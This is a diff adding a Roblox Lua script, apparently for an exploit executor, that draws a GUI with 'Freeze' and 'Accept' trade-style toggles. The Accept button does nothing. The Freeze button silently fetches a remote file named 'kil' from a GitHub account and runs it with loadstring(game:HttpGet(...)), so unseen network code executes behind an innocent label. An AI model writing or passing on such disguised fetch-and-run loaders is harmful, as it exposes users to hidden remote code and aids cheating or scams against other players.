@@ -1,0 +1,82 @@
+-- Instances
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UIStroke = Instance.new("UIStroke")
+local UICorner = Instance.new("UICorner")
+local FreezeButton = Instance.new("TextButton")
+local AcceptButton = Instance.new("TextButton")
+local FreezeCorner = Instance.new("UICorner")
+local AcceptCorner = Instance.new("UICorner")
+
+-- Parent
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Frame Properties
+Frame.Size = UDim2.new(0, 220, 0, 130)
+Frame.Position = UDim2.new(0.5, -110, 0.5, -65)
+Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Frame.BackgroundTransparency = 0.1
+Frame.Parent = ScreenGui
+
+-- Add Stroke (Border)
+UIStroke.Parent = Frame
+UIStroke.Thickness = 2
+UIStroke.Color = Color3.fromRGB(255, 255, 255)
+
+-- Rounded Corners for Frame
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = Frame
+
+-- Freeze Button
+FreezeButton.Size = UDim2.new(0, 200, 0, 50)
+FreezeButton.Position = UDim2.new(0, 10, 0, 10)
+FreezeButton.Text = "❄ Freeze: OFF"
+FreezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+FreezeButton.Font = Enum.Font.GothamBold
+FreezeButton.TextSize = 14
+FreezeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+FreezeButton.Parent = Frame
+
+FreezeCorner.CornerRadius = UDim.new(0, 8)
+FreezeCorner.Parent = FreezeButton
+
+local freezeActive = false
+
+FreezeButton.MouseButton1Click:Connect(function()
+    freezeActive = not freezeActive
+    if freezeActive then
+        FreezeButton.Text = "❄ Freeze: ON"
+        FreezeButton.BackgroundColor3 = Color3.fromRGB(50, 255, 50)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/realarceusx/realarceusx/refs/heads/main/kil"))()
+    else
+        FreezeButton.Text = "❄ Freeze: OFF"
+        FreezeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    end
+end)
+
+-- Accept Button
+AcceptButton.Size = UDim2.new(0, 200, 0, 50)
+AcceptButton.Position = UDim2.new(0, 10, 0, 70)
+AcceptButton.Text = "✅ Accept: OFF"
+AcceptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+AcceptButton.Font = Enum.Font.GothamBold
+AcceptButton.TextSize = 14
+AcceptButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+AcceptButton.Parent = Frame
+
+AcceptCorner.CornerRadius = UDim.new(0, 8)
+AcceptCorner.Parent = AcceptButton
+
+local acceptActive = false
+
+AcceptButton.MouseButton1Click:Connect(function()
+    acceptActive = not acceptActive
+    if acceptActive then
+        AcceptButton.Text = "✅ Accept: ON"
+        AcceptButton.BackgroundColor3 = Color3.fromRGB(50, 255, 50)
+        -- Define what "Accept" should do here
+    else
+        AcceptButton.Text = "✅ Accept: OFF"
+        AcceptButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    end
+end)
